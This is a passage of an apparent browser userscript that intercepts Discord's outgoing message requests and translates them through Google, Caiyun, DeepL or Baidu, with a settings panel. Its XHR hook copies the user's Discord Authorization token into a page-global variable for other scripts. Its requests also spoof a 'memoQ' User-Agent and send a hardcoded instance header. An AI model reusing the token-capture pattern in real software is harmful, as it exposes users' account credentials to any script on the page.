GMDiscordTrsOpt.GMDiscordTrssplitStrDef = GM_getValue('GMDiscordTrssplitStrDef') ? GM_getValue('GMDiscordTrssplitStrDef') : "\r\n";
GMDiscordTrsOpt.GMDiscordTrsOnlyDist = GM_getValue(['GMDiscordTrsOnlyDist']) === true ? true: false;
GMDiscordTrsOpt.GMDiscordTrsApiKey = GM_getValue('GMDiscordTrsApiKey') ? GM_getValue('GMDiscordTrsApiKey') : "";
GMDiscordTrsOpt.GMDiscordTrsAppId = GM_getValue('GMDiscordTrsAppId') ? GM_getValue('GMDiscordTrsAppId') : "";
GMDiscordTrsOpt.GMDiscordTrsFromLang = !GM_getValue('GMDiscordTrsFromLang') ? 0 : GM_getValue('GMDiscordTrsFromLang');
GMDiscordTrsOpt.GMDiscordTrsToLang = !GM_getValue('GMDiscordTrsToLang') ? 0 : GM_getValue('GMDiscordTrsToLang');
GMDiscordTrsOpt.GMDiscordTrsShowEngine = !GM_getValue('GMDiscordTrsShowEngine') ? false : GM_getValue('GMDiscordTrsShowEngine');
var engineFuncs = {
    Google: function(text, callback) {
        var langPars = ['ja', 'zh-CN', 'en', 'auto', 'es', 'zh-CN', 'pt'];
        GM_xmlhttpRequest({
            method: 'GET',
            url: "https://translate.google.com/translate_a/single?client=at&sl=" + langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang] + "&tl=" + langPars[GMDiscordTrsOpt.GMDiscordTrsToLang] + "&dt=t&q=" + encodeURIComponent(text),
            onload: function(responseDetails) {
                //console.warn(responseDetails);
                try {
                    var result = JSON.parse(responseDetails.response);
                    var tt = "";
                    result[0].forEach(function(a) {
                        tt += a[0]
                    });
                    callback(tt);
                } catch(e) {
                    callback("");
                    console.error(e);
                }
            },
            "headers": {
                "User-Agent": "memoQ",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
            },
            onerror: function(error) {
                console.error(error);
            }
        });
    },
    Caiyun: function(text, callback) {
        var langPars = ['ja', 'zh', 'en', 'auto', 'es', 'zh', 'pt'];
        GM_xmlhttpRequest({
            method: 'POST',
            url: "http://api.interpreter.caiyunai.com/v1/translator",
            data: JSON.stringify({
                "source": text,
                "trans_type": langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang] + "2" + langPars[GMDiscordTrsOpt.GMDiscordTrsToLang],
                "request_id": "demo",
                "detect": false,
            }),
            onload: function(responseDetails) {
                try {
                    console.warn(responseDetails);
                    var result = JSON.parse(responseDetails.response);
                    callback(result.target);
                } catch(e) {
                    callback("");
                    console.error(e);
                }
            },
            "headers": {
                "Content-type": "application/json",
                'x-authorization': "token " + GMDiscordTrsOpt.GMDiscordTrsApiKey
            },
            onerror: function(error) {
                console.error(error);
            }
        });
    },
    DeepL: function(text, callback) {
        var langPars = ['JA', 'ZH', 'EN', 'AUTO', 'ES', 'ZH', 'PT'];
        var preArg = "ignore_tags=trsIgnoretag&tag_handling=xml&source_lang=" + langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang] + "&target_lang=" + langPars[GMDiscordTrsOpt.GMDiscordTrsToLang] + "&preserve_formatting=0&auth_key=" + GMDiscordTrsOpt.GMDiscordTrsApiKey;
        GM_xmlhttpRequest({
            method: 'POST',
            url: "https://api.deepl.com/v1/translate",
            data: preArg + "&text=" + encodeURIComponent(text),
            onload: function(responseDetails) {
                try {
                    //console.warn(responseDetails);
                    var result = JSON.parse(responseDetails.response);
                    callback(result.translations[0].text);
                } catch(e) {
                    callback("");
                    console.error(e);
                }
            },
            "headers": {
                "User-Agent": "memoQ",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Content-type": "application/x-www-form-urlencoded",
                "X-Instance": "QzBDQTdCRjNGODREQAAZ0VBNzTTXTRCRUFFMTgwMEUyMDMAAfxQTlBMTIyQjA0MDgwRTM5ODxxsazQTdGRA=="
            },
            onerror: function(error) {
                console.error(error);
            }
        });
    },
    Baidu: function(text, callback) {
        var langPars = ['jp', 'zh', 'en', 'auto', 'spa', 'zh', 'pt'];
        var appid = GMDiscordTrsOpt.GMDiscordTrsAppId;
        var key = GMDiscordTrsOpt.GMDiscordTrsApiKey;
        var salt = "125637";
        var str1 = appid + text + salt + key;
        var sign = md5(str1).toLowerCase();
        var query = "q=" + encodeURIComponent(text) + "&appid=" + encodeURIComponent(appid) + "&salt=" + encodeURIComponent(salt) + "&from=" + encodeURIComponent(langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang]) + "&to=" + encodeURIComponent(langPars[GMDiscordTrsOpt.GMDiscordTrsToLang]) + "&sign=" + encodeURIComponent(sign);
        GM_xmlhttpRequest({
            method: 'POST',
            url: 'https://api.fanyi.baidu.com/api/trans/vip/translate',
            data: query,
            onload: function(responseDetails) {
                try {
                    //console.warn(responseDetails);
                    var result = JSON.parse(responseDetails.response);
                    var rText = "";
                    for (var i = 0; i < result.trans_result.length; i++) {
                        if (i > 0) {
                            rText += "\r\n";
                        }
                        rText += result.trans_result[i].dst;
                    }
                    callback(rText);
                } catch(e) {
                    callback("");
                    console.error(e);
                }
            },
            "headers": {
                "accept": "*/*",
                "accept-language": "zh-CN,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7,en;q=0.6,eo;q=0.5",
                "cache-control": "no-cache",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            onerror: function(error) {
                console.error(error);
            }
        });
    }
};
GMDiscordTrsOpt.GMDiscordTrsEngine = (Object.keys(engineFuncs).indexOf(GM_getValue('GMDiscordTrsEngine')) !== -1) ? GM_getValue('GMDiscordTrsEngine') : "Google";
GMDiscordTrsOpt.GMDiscordTrsEngineLast = GMDiscordTrsOpt.GMDiscordTrsEngine;
(function() {
    'use strict';
    unsafeWindow.eval(hookAjax);

    unsafeWindow.hookAjax({
        setRequestHeader: function(arg, xhr) {
            if (arg[0] == "Authorization") {
                //为其他脚本设置的这个....你可以干掉它.
                unsafeWindow.userToken = arg[1];
            }
        },
        open: function(args, xhr) {
            xhr.url = args[1]
            return false;
        },
        send: function(args, xhr) {
            if (!GMDiscordTrsOpt.GMDiscordTrsOn || GMDiscordTrsOpt.GMDiscordTrsToLang === GMDiscordTrsOpt.GMDiscordTrsFromLang) {
                return false;
            }
            if (xhr.url.match(/https:\/\/discord.com\/api\/v\d+\/channels\/\d+\/messages/)) {
                if (args[0]) {
                    if (xhr.fixed) {
                        return false;
                    }
                    xhr.fixed = true;
                    try{
                        //debugger;
                        var msg = JSON.parse(args[0]);
                        if (msg.content && msg.content.length > 1) {
                            var cb = (function(msg, xhr) {
                                return function(text) {
                                    if(text !== ""){
                                        if(GMDiscordTrsOpt.GMDiscordTrsShowEngine){
                                            text = GMDiscordTrsOpt.GMDiscordTrsEngine + ": " + text;
                                        }
                                        if(GMDiscordTrsOpt.GMDiscordTrsToLang === 5){
                                            text = s2t(text);
                                        }
                                        if(GMDiscordTrsOpt.GMDiscordTrsToLang === 1){
                                            text = t2s(text);
                                        }
                                        if(msg.content && msg.content !== text){
                                            if (GMDiscordTrsOpt.GMDiscordTrsOnlyDist) {
                                                msg.content = text;
                                            } else {
                                                msg.content = msg.content + GMDiscordTrsOpt.GMDiscordTrssplitStrDef + text;
                                            }
                                        }
                                    }
                                    xhr.send(JSON.stringify(msg));
                                }
                            })(msg, xhr);
                            if((GMDiscordTrsOpt.GMDiscordTrsToLang === 5 && GMDiscordTrsOpt.GMDiscordTrsFromLang === 1) || (GMDiscordTrsOpt.GMDiscordTrsToLang === 1 && GMDiscordTrsOpt.GMDiscordTrsFromLang === 5)){
                                setTimeout((function(cb,text){
                                    cb(text);
                                })(cb,msg.content),10);
                                return true;
                            }
                            engineFuncs[GMDiscordTrsOpt.GMDiscordTrsEngine](msg.content, cb);
                            return true;
                        }
                    } catch(e) {
                        console.error(e);
                    }
                    return false;
                }
            }
            return false;
        }
    });

    function appendLangTrsSelect(fromSelAppendTo, toSelAppendTo) {
        var fromSel = document.createElement('Select');
        var toSel = document.createElement('Select');
        for (var i = 0; i < langCodes.length; i++) {
            if (i === 3) {
                continue;
            }
            var fromOpt = document.createElement('Option');
            var toOpt = document.createElement('Option');
            fromOpt.innerText = langCodes[i];
            fromOpt.value = i.toString();
            fromSel.appendChild(fromOpt);
            if (i !== 3) { //"自动检测/AutoDetect"
                toOpt.innerText = langCodes[i];
                toOpt.value = i.toString();
                toSel.appendChild(toOpt);
            }
        }
        fromSel.value = GMDiscordTrsOpt.GMDiscordTrsFromLang.toString();
        toSel.value = GMDiscordTrsOpt.GMDiscordTrsToLang.toString();
        fromSel.onchange = function(ev) {
            GMDiscordTrsOpt.GMDiscordTrsFromLang = this.value * 1;
            GM_setValue('GMDiscordTrsFromLang', this.value * 1);
        }
        toSel.onchange = function(ev) {
            GMDiscordTrsOpt.GMDiscordTrsToLang = this.value * 1;
            GM_setValue('GMDiscordTrsToLang', this.value * 1);
        }
        fromSelAppendTo.appendChild(fromSel);
        toSelAppendTo.appendChild(toSel);
    }

    function addTextInputGMSet(name, getValWrapFunc, setValWrapFunc, hide) {
        var inputTrs = document.createElement("input");
        inputTrs.type = "text";
        if (hide) {
            inputTrs.style.backgroundColor = "#fff";
            inputTrs.style.color = "#fff";
        }
        var gvar = GMDiscordTrsOpt[name];
        if (getValWrapFunc) {
            gvar = getValWrapFunc(gvar);
        }
        inputTrs.value = gvar;
        var EvFunc = (function(name, getValWrapFunc, setValWrapFunc) {
            return function() {
                var val = this.value;
                if (setValWrapFunc) {
                    val = setValWrapFunc(val);
                }
                GMDiscordTrsOpt[name] = val;
                GM_setValue(name, val);
            }
        })(name, getValWrapFunc, setValWrapFunc);
        inputTrs.onchange = EvFunc;
        inputTrs.onkeydown = EvFunc;
        if (hide) {
            inputTrs.onfocus = function() {
                this.style.color = "#000";
            }
            inputTrs.onblur = function() {
                this.style.color = "#fff";
            }
        }
        return inputTrs;
    }
    function addCheckBoxInputGMSet(name, getValWrapFunc, setValWrapFunc) {
        var inputTrs = document.createElement("input");
        inputTrs.type = "checkbox";
        var gvar = GMDiscordTrsOpt[name];
        if (getValWrapFunc) {
            gvar = getValWrapFunc(gvar);
        }
        inputTrs.checked = gvar;
        var EvFunc = (function(name) {
            return function() {
                var val = this.checked;
                if (getValWrapFunc) {
                    val = setValWrapFunc(val);
                }
                GMDiscordTrsOpt[name] = val;
                GM_setValue(name, val);
            }
        })(name);
        inputTrs.onchange = EvFunc;
        return inputTrs;
    }
    function toggleOptions() {
        var CHackDiscordTrsToolOptionDiv = document.getElementById('CHackDiscordTrsToolOptionDiv');
        if (CHackDiscordTrsToolOptionDiv) {
            CHackDiscordTrsToolOptionDiv.remove();
            return;
        }
        //var computedStyleAppMount = document.defaultView.getComputedStyle(document.getElementById('app-mount'));
        //var computedStyleHeader = document.defaultView.getComputedStyle(document.querySelector('header[class^=header]'));

        var wrap = document.createElement("div");
        wrap.id = "CHackDiscordTrsToolOptionDiv";
        wrap.style = "position: fixed;display: inline-block;background-color: var(--background-secondary);color: var(--interactive-active);z-index: 999999999;right: 1em;top: 3em;padding: 1em;border-radius: 1em;box-shadow: 0 0 4px #000;";

        wrap.insertAdjacentHTML('beforeend', "<br>Global Switch: ");
        wrap.insertAdjacentElement('beforeend', addCheckBoxInputGMSet('GMDiscordTrsOn'));

        wrap.insertAdjacentHTML('beforeend', "<br>Only Send Dest Lang: ");
        wrap.insertAdjacentElement('beforeend', addCheckBoxInputGMSet('GMDiscordTrsOnlyDist'));

        wrap.insertAdjacentHTML('beforeend', "<br>Show Engine In Msg: ");
        wrap.insertAdjacentElement('beforeend', addCheckBoxInputGMSet('GMDiscordTrsShowEngine'));
        var inputSplit = addTextInputGMSet("GMDiscordTrssplitStrDef",
                                           function(val) {
            val = JSON.stringify(val);
            val = val.substr(1, val.length - 2);
            return val;
        },
                                           function(val) {
            return JSON.parse('"' + val.replace(/"/g, '\"') + '"');
        });

        wrap.insertAdjacentHTML('beforeend', "<br>Split for Src / Dst text: ");
        wrap.insertAdjacentElement('beforeend', inputSplit);

        wrap.insertAdjacentHTML('beforeend', "<br>ApiKey: ");
        wrap.insertAdjacentElement('beforeend', addTextInputGMSet("GMDiscordTrsApiKey", undefined, undefined, true));

        wrap.insertAdjacentHTML('beforeend', "<br>AppId: ");
        wrap.insertAdjacentElement('beforeend', addTextInputGMSet("GMDiscordTrsAppId", undefined, undefined, true));
        wrap.insertAdjacentHTML('beforeend', "(If needed)");

        wrap.insertAdjacentHTML('beforeend', "<br> Engine: ");
        Object.keys(engineFuncs).forEach(function(e) {
            var inputTrsEngine = document.createElement("input");
            inputTrsEngine.type = "radio";
            inputTrsEngine.name = "TrsEnging";
            inputTrsEngine.checked = GMDiscordTrsOpt.GMDiscordTrsEngine === e;
            inputTrsEngine.onchange = (function(e) {
                return function() {
                    GMDiscordTrsOpt.GMDiscordTrsEngine = e;
                    GM_setValue('GMDiscordTrsEngine', e);
                    GM_setValue('GMDiscordTrsEngineAppKey_' + GMDiscordTrsOpt.GMDiscordTrsEngineLast, GMDiscordTrsOpt.GMDiscordTrsApiKey);
                    GM_setValue('GMDiscordTrsEngineAppId_' + GMDiscordTrsOpt.GMDiscordTrsEngineLast, GMDiscordTrsOpt.GMDiscordTrsAppId);
                    var appk = GM_getValue('GMDiscordTrsEngineAppKey_' + e);
                    var appi = GM_getValue('GMDiscordTrsEngineAppId_' + e);
                    if (appk) {
                        GM_setValue('GMDiscordTrsApiKey', appk);
                        GMDiscordTrsOpt.GMDiscordTrsApiKey = appk;
                    } else {
                        GM_setValue('GMDiscordTrsApiKey', "");
                        GMDiscordTrsOpt.GMDiscordTrsApiKey = "";
                    }
                    if (appi) {
                        GM_setValue('GMDiscordTrsAppId', appi);
                        GMDiscordTrsOpt.GMDiscordTrsAppId = appi;
                    } else {
                        GM_setValue('GMDiscordTrsAppId', "");
                        GMDiscordTrsOpt.GMDiscordTrsAppId = "";
                    }
                    GMDiscordTrsOpt.GMDiscordTrsEngineLast = e;
                    toggleOptions();
                    toggleOptions();
                }
            })(e);
            wrap.insertAdjacentElement('beforeend', inputTrsEngine);
            wrap.insertAdjacentHTML('beforeend', " " + e + " ");
        });

        wrap.insertAdjacentHTML('beforeend', "<br> ");
        var fromSpan = document.createElement("span");
        var toSpan = document.createElement("span");
        fromSpan.innerText = "Src Lang: ";
        toSpan.innerText = "Dst Lang: ";
        appendLangTrsSelect(fromSpan, toSpan);
        wrap.insertAdjacentElement('beforeend', fromSpan);
        wrap.insertAdjacentElement('beforeend', toSpan);
        document.body.insertAdjacentElement('beforeend', wrap);
    }

    setInterval(function() {
        var target = document.querySelector('a[href="https://support.discord.com"]');
        if (target) {
            target.onclick = function(ev) {
                ev.preventDefault();
                ev.stopImmediatePropagation();
                ev.stopPropagation();
                toggleOptions();
            }
        }
    },
                100);
})();
})})()